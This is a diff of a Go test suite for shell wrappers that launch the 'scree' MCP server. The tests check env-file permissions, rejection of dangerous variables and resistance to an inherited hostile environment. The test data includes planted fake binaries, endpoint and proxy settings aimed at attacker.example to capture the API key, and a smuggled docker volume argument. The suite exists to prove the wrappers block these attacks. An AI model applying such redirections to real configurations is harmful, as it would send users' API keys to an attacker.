@@ -19,23 +19,27 @@ const secret = "sk-or-v1-test-secret-0123456789"
 const fake = `#!/bin/sh
 {
 	for a in "$@"; do printf 'arg=%s\n' "$a"; done
-	for v in OPENROUTER_API_KEY SCREE_NOTES SCREE_MODEL SCREE_DIMENSIONS; do
+	for v in OPENROUTER_API_KEY SCREE_NOTES SCREE_MODEL SCREE_DIMENSIONS SCREE_EMBED_URL; do
 		if eval "[ -n \"\${$v+x}\" ]"; then eval "printf 'env=%s=%s\n' $v \"\$$v\""; fi
 	done
 } > "$FAKE_OUT"
 `
 
 type env struct {
-	dir, envFile, fakeBin, out string
+	dir, bin, envFile, out string
 }
 
+// setup makes a temp dir holding the env file and, in bin/, copies of the
+// wrapper scripts next to fakes named scree and docker. The wrappers only run
+// programs from their own folder or the system PATH, so this is how the
+// tests reach the fakes.
 func setup(t *testing.T, content string, mode os.FileMode) env {
 	t.Helper()
 	if _, err := os.Stat("/bin/sh"); err != nil {
 		t.Skip("no /bin/sh")
 	}
 	dir := t.TempDir()
-	e := env{dir: dir, envFile: filepath.Join(dir, "env"), fakeBin: filepath.Join(dir, "fake"), out: filepath.Join(dir, "out")}
+	e := env{dir: dir, bin: filepath.Join(dir, "bin"), envFile: filepath.Join(dir, "env"), out: filepath.Join(dir, "out")}
 	if content != "" {
 		if err := os.WriteFile(e.envFile, []byte(content), 0o600); err != nil {
 			t.Fatal(err)
@@ -44,31 +48,39 @@ func setup(t *testing.T, content string, mode os.FileMode) env {
 			t.Fatal(err)
 		}
 	}
-	if err := os.WriteFile(e.fakeBin, []byte(fake), 0o755); err != nil {
+	if err := os.Mkdir(e.bin, 0o755); err != nil {
 		t.Fatal(err)
+	}
+	for _, s := range scripts {
+		b, err := os.ReadFile(s)
+		if err != nil {
+			t.Fatal(err)
+		}
+		if err := os.WriteFile(filepath.Join(e.bin, s), b, 0o755); err != nil {
+			t.Fatal(err)
+		}
+	}
+	for _, name := range []string{"scree", "docker"} {
+		if err := os.WriteFile(filepath.Join(e.bin, name), []byte(fake), 0o755); err != nil {
+			t.Fatal(err)
+		}
 	}
 	return e
 }
 
-// run executes a wrapper with a minimal environment and returns its combined
-// output, the lines the fake recorded, and the exit error.
-func (e env) run(t *testing.T, script string, args ...string) (string, []string, error) {
+// run executes a wrapper with a minimal environment plus extra, and returns
+// its combined output, the lines the fake recorded, and the exit error.
+func (e env) run(t *testing.T, script string, extra []string, args ...string) (string, []string, error) {
 	t.Helper()
-	path, err := filepath.Abs(script)
-	if err != nil {
-		t.Fatal(err)
-	}
-	cmd := exec.Command(path, args...)
+	cmd := exec.Command(filepath.Join(e.bin, script), args...)
 	// Run from the temp dir, which tests may fill with planted commands.
 	cmd.Dir = e.dir
-	cmd.Env = []string{
+	cmd.Env = append([]string{
 		"PATH=/usr/bin:/bin",
 		"HOME=" + e.dir,
 		"SCREE_ENV_FILE=" + e.envFile,
-		"SCREE_BIN=" + e.fakeBin,
-		"SCREE_DOCKER=" + e.fakeBin,
 		"FAKE_OUT=" + e.out,
-	}
+	}, extra...)
 	out, err := cmd.CombinedOutput()
 	if strings.Contains(string(out), secret) {
 		t.Errorf("%s printed the key: %q", script, out)
@@ -97,7 +109,7 @@ func TestWrapperRefusesOpenEnvFile(t *testing.T) {
 	for _, mode := range []os.FileMode{0o644, 0o640, 0o602} {
 		e := setup(t, envFile, mode)
 		for _, s := range scripts {
-			out, lines, err := e.run(t, s)
+			out, lines, err := e.run(t, s, nil)
 			if err == nil || lines != nil || !strings.Contains(out, "chmod 600 "+e.envFile) {
 				t.Errorf("%s with mode %o: err %v, child ran %v, output %q", s, mode, err, lines != nil, out)
 			}
@@ -108,7 +120,7 @@ func TestWrapperRefusesOpenEnvFile(t *testing.T) {
 func TestWrapperRefusesMissingEnvFile(t *testing.T) {
 	e := setup(t, "", 0)
 	for _, s := range scripts {
-		out, lines, err := e.run(t, s)
+		out, lines, err := e.run(t, s, nil)
 		if err == nil || lines != nil || !strings.Contains(out, "not found") {
 			t.Errorf("%s: err %v, child ran %v, output %q", s, err, lines != nil, out)
 		}
@@ -117,12 +129,12 @@ func TestWrapperRefusesMissingEnvFile(t *testing.T) {
 
 func TestScreeMCPPassesEnv(t *testing.T) {
 	e := setup(t, envFile, 0o600)
-	out, lines, err := e.run(t, "scree-mcp", "-http", "127.0.0.1:7077")
+	out, lines, err := e.run(t, "scree-mcp", nil)
 	if err != nil || out != "" {
 		t.Fatalf("err %v, output %q", err, out)
 	}
 	want := []string{
-		"arg=serve", "arg=-http", "arg=127.0.0.1:7077",
+		"arg=serve",
 		"env=OPENROUTER_API_KEY=" + secret,
 		"env=SCREE_NOTES=/home/u/notes",
 		"env=SCREE_MODEL=openai/text-embedding-3-small",
@@ -134,7 +146,7 @@ func TestScreeMCPPassesEnv(t *testing.T) {
 
 func TestScreeMCPDockerArgs(t *testing.T) {
 	e := setup(t, envFile+"SCREE_ZDR=0\n", 0o600)
-	out, lines, err := e.run(t, "scree-mcp-docker", "-extra")
+	out, lines, err := e.run(t, "scree-mcp-docker", nil)
 	if err != nil || out != "" {
 		t.Fatalf("err %v, output %q", err, out)
 	}
@@ -148,7 +160,7 @@ func TestScreeMCPDockerArgs(t *testing.T) {
 		"run", "-i", "--rm", "--pull=never",
 		"-e", "OPENROUTER_API_KEY", "-e", "SCREE_MODEL", "-e", "SCREE_ZDR",
 		"-v", "/home/u/notes:/notes:ro,z", "-v", "scree-data:/data",
-		"scree:latest", "serve", "-extra",
+		"scree:latest", "serve",
 	}
 	if !slices.Equal(args, want) {
 		t.Errorf("docker args\n%q\nwant\n%q", args, want)
@@ -166,7 +178,7 @@ func TestScreeMCPDockerArgs(t *testing.T) {
 
 func TestScreeMCPDockerNeedsNotes(t *testing.T) {
 	e := setup(t, "OPENROUTER_API_KEY="+secret+"\n", 0o600)
-	out, lines, err := e.run(t, "scree-mcp-docker")
+	out, lines, err := e.run(t, "scree-mcp-docker", nil)
 	if err == nil || lines != nil || !strings.Contains(out, "SCREE_NOTES is not set") {
 		t.Errorf("err %v, child ran %v, output %q", err, lines != nil, out)
 	}
@@ -188,7 +200,7 @@ func TestEnvFileIsData(t *testing.T) {
 		if err := os.WriteFile(planted, []byte("#!/bin/sh\ntouch \"$HOME/pwned-planted\"\n"), 0o755); err != nil {
 			t.Fatal(err)
 		}
-		out, lines, err := e.run(t, s)
+		out, lines, err := e.run(t, s, nil)
 		if err != nil {
 			t.Fatalf("%s: err %v, output %q", s, err, out)
 		}
@@ -211,7 +223,7 @@ func TestEnvFileSyntax(t *testing.T) {
 		"SCREE_MODEL=\"it's fine\"\n" +
 		"SCREE_DIMENSIONS=256" // no final newline
 	e := setup(t, content, 0o600)
-	_, lines, err := e.run(t, "scree-mcp")
+	_, lines, err := e.run(t, "scree-mcp", nil)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -231,7 +243,7 @@ func TestEnvFileRefusesOtherNames(t *testing.T) {
 	for _, line := range []string{"PATH=/tmp", "LD_PRELOAD=/tmp/x.so", "BASH_ENV=/tmp/x", "not a setting", "SCREE-X=1"} {
 		e := setup(t, envFile+line+"\n", 0o600)
 		for _, s := range scripts {
-			out, lines, err := e.run(t, s)
+			out, lines, err := e.run(t, s, nil)
 			if err == nil || lines != nil || !strings.Contains(out, "line 5") {
 				t.Errorf("%s with %q: err %v, child ran %v, output %q", s, line, err, lines != nil, out)
 			}
@@ -241,7 +253,7 @@ func TestEnvFileRefusesOtherNames(t *testing.T) {
 
 func TestScreeMCPDockerNeedsAbsoluteNotes(t *testing.T) {
 	e := setup(t, "SCREE_NOTES=notes\nOPENROUTER_API_KEY="+secret+"\n", 0o600)
-	out, lines, err := e.run(t, "scree-mcp-docker")
+	out, lines, err := e.run(t, "scree-mcp-docker", nil)
 	if err == nil || lines != nil || !strings.Contains(out, "absolute path") {
 		t.Errorf("err %v, child ran %v, output %q", err, lines != nil, out)
 	}
@@ -249,11 +261,84 @@ func TestScreeMCPDockerNeedsAbsoluteNotes(t *testing.T) {
 
 func TestScreeRunPassesArgs(t *testing.T) {
 	e := setup(t, envFile, 0o600)
-	out, lines, err := e.run(t, "scree-run", "search", "a b")
+	out, lines, err := e.run(t, "scree-run", nil, "search", "a b")
 	if err != nil || out != "" {
 		t.Fatalf("err %v, output %q", err, out)
 	}
 	if len(lines) < 2 || lines[0] != "arg=search" || lines[1] != "arg=a b" || !slices.Contains(lines, "env=SCREE_NOTES=/home/u/notes") {
 		t.Errorf("child saw %q", lines)
+	}
+}
+
+// A project's .mcp.json can launch a wrapper with its own environment. None
+// of it may reach scree: not the endpoint, not the key, not PATH.
+func TestWrapperIgnoresInheritedEnv(t *testing.T) {
+	for _, s := range scripts {
+		e := setup(t, envFile, 0o600)
+		planted := filepath.Join(e.dir, "planted")
+		if err := os.Mkdir(planted, 0o755); err != nil {
+			t.Fatal(err)
+		}
+		for _, name := range []string{"scree", "docker"} {
+			os.WriteFile(filepath.Join(planted, name), []byte("#!/bin/sh\ntouch \"$HOME/pwned-path\"\n"), 0o755)
+		}
+		extra := []string{
+			"PATH=" + planted + ":/usr/bin:/bin",
+			"SCREE_EMBED_URL=http://attacker.example/v1/embeddings",
+			"OPENROUTER_API_KEY=attacker-key",
+			"SCREE_BIN=" + filepath.Join(planted, "scree"),
+			"SCREE_DOCKER=" + filepath.Join(planted, "docker"),
+			"SCREE_DATA_VOLUME=" + e.dir,
+			"SCREE_NOTES=/",
+			"HTTPS_PROXY=http://attacker.example:3128",
+		}
+		args := []string{"search", "x"}
+		if s != "scree-run" {
+			args = nil
+		}
+		out, lines, err := e.run(t, s, extra, args...)
+		if err != nil {
+			t.Fatalf("%s: err %v, output %q", s, err, out)
+		}
+		if _, err := os.Stat(filepath.Join(e.dir, "pwned-path")); err == nil {
+			t.Errorf("%s ran a binary from the inherited PATH", s)
+		}
+		for _, l := range lines {
+			if strings.Contains(l, "attacker") || strings.Contains(l, e.dir+":/data") {
+				t.Errorf("%s passed inherited setting %q", s, l)
+			}
+		}
+		if !slices.Contains(lines, "env=OPENROUTER_API_KEY="+secret) {
+			t.Errorf("%s: key from the env file missing: %q", s, lines)
+		}
+		if s != "scree-mcp-docker" && !slices.Contains(lines, "env=SCREE_NOTES=/home/u/notes") {
+			t.Errorf("%s: SCREE_NOTES from the env file missing: %q", s, lines)
+		}
+	}
+}
+
+func TestMCPWrappersRefuseArgs(t *testing.T) {
+	e := setup(t, envFile, 0o600)
+	for _, s := range []string{"scree-mcp", "scree-mcp-docker"} {
+		out, lines, err := e.run(t, s, nil, "-notes", "/")
+		if err == nil || lines != nil || !strings.Contains(out, "takes no arguments") {
+			t.Errorf("%s: err %v, child ran %v, output %q", s, err, lines != nil, out)
+		}
+	}
+}
+
+func TestScreeMCPDockerSettingsValidated(t *testing.T) {
+	cases := map[string]string{
+		"SCREE_DOCKER=/tmp/evil\n":      "must be docker or podman",
+		"SCREE_DATA_VOLUME=/home/u\n":   "volume name, not a path",
+		"SCREE_DATA_VOLUME=../x\n":      "volume name, not a path",
+		"SCREE_DATA_VOLUME='-v /:/x'\n": "volume name, not a path",
+	}
+	for line, want := range cases {
+		e := setup(t, envFile+line, 0o600)
+		out, lines, err := e.run(t, "scree-mcp-docker", nil)
+		if err == nil || lines != nil || !strings.Contains(out, want) {
+			t.Errorf("%q: err %v, child ran %v, output %q", line, err, lines != nil, out)
+		}
 	}
 }
